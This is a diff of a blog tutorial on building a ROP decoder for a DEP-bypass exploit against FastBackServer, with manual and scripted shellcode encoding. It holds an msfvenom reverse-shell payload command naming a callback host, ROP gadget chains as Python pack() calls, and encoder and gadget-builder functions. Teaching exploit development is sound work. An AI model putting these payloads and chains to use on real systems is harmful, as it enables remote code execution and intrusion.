@@ -18,11 +18,15 @@ tags:
 toc: true
 ---
 # Introduction
+
 Welcome All!, In this blog post we will be talking about creating a `ROPDecoder` from scratch as many people face issues in understand the automated process of it. 	And note that you must know how to bypass `DEP` and what's `ROPGadgets`, We wil be Starting from selecting our `ROP` Gadget, Going to encoding and decoding our shellcode manually, Then moving further to automate the process in 2 ways, A basic way that still needs a small interaction from us, And more advanced way that automate it by `90%`, And we would just need to provide our Gadget to it. 
+
 # The Case
+
 Why do we need to have a `ROPDecoder` ?, First, We need to fix the bad characters problems, So when we are generating a shellcode using `msfvenom` as example, We always provide the bad characters that could crash our exploit using `-b` argument (`ex: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"`), What will happen here is that the `encoder` will encode these bad characters, After that during the runtime or the execution of the shellcode the shellcode will retrive the encoded bad characters and then complete the execution, But when we are bypassing mitigations like `DEP` using `WriteProcessMemory` API, Our exploit will crash, As the goal of this API is to write data from place to another in the memory, The place that the API will write to, Have to be marked with execution permissions, And such locations in memory are in the `.text` or code section of the software So, The issue with it is that the location is not writable (During the execution of `WriteProcessMemory` it will change the location permission to writable and after writing the data, It will retrive the old permissions to it), Therefor, As the location is not writable, Then when the decoder in the shellcode try to replace the bad characters which requires to write or change in it's place, It needs write permissions which are not avaliable. As a result, It will cause a crash and won't be executed and `Access Violation` will be rasied.
 
 # Weponizing w/ Gadgets
+
 We will be using `FastBackServer` as our target, First we need to get our own gadget from one of `FastBackServer` modules, Here i picked up `CSFTPAV6.dll` module. When we are decoding our shellcode, We have to focus on the following type of gadgets:
 
 - `add byte [reg]`
@@ -87,7 +91,9 @@ As there are no gadgets that perform direct operations on `esi` to make it point
 	- Finally, Apply the decoding gadget.
 7. `0x5051579a: add eax, ecx ; ret  ;`:
 	- For adding the previous
+
 # Manually Encoding/Decoding
+
 After getting our gadget and make sure it doesn't has any bad characters, Which in my case are `"\x00\x09\x0a\x0b\x0c\x0d\x20"`. Now, Our full gadget is as the following:
 ```python
 ROPDecoder = pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
@@ -104,6 +110,7 @@ ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode t
 
 
 ## Encoding
+
 Now, It's time to generate our shellcode, And for our testing case, We will use `Windows/exec` payload for now. And we will use it just to pop a calculator:
 
 ![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/f99e01ab-7cf9-47b1-bd7f-66a8b96289c3)
@@ -150,6 +157,7 @@ We replaced/encoded the bad characters with the results we have got.
 Now, Before we decode our shellcode, We need to have 2 things:
 - The offset/index for each bad character.
 - The positive value for `0xfb` that we used in encoding.
+  
 Note:
 ```
 If we have a `sub` gadget we could sub directly with the same value we used for encoding, In this case `0xfb`.
@@ -251,7 +259,9 @@ Now, After getting the differance between indexes, We can now make it into the n
 | 18 - 6 |12| 0xfffffff4|
 | 6 - 5 |1|0xffffffff|
 | 5 - 4 |1|0xffffffff|
+
 ### Positive value & Verify decoding
+
 Secondly, We need to get the positive value for `0xfb` as we used it for encoding, Our decoding gadget is `add` gadget, So we need to get the positive value for `0xfb`:
 
 ![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/bdab2e2a-f901-4831-9135-e72f4f59be92)
@@ -546,9 +556,12 @@ Here I created a function that takes 3 arguments, `shellcode` which is the file 
 ![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/5934ff21-664d-41aa-ac25-5efb737796d2)
 
 
-Now, We can repeat the same process from the manual way
+Now, We can repeat the same process from the manual way.
+
 ## The Advanced Way
+
 Now, In this way we will automate mostly 90% of everything. We will start by using the ssame encoding function in the basic way, Then we will add a function to create the gadget for us automatically:
+
 ```python
 from struct import pack
 def encode_shellcode(shellcode, badchars, encode_value):
@@ -613,6 +626,7 @@ offsets_to_decode = subtract_consecutive_elements(list(reversed(bad_index)))
 for i in offsets_to_decode:
     rop += create_gadget(0x05050505, i)
 ```
+
 - Output:
 
 ```
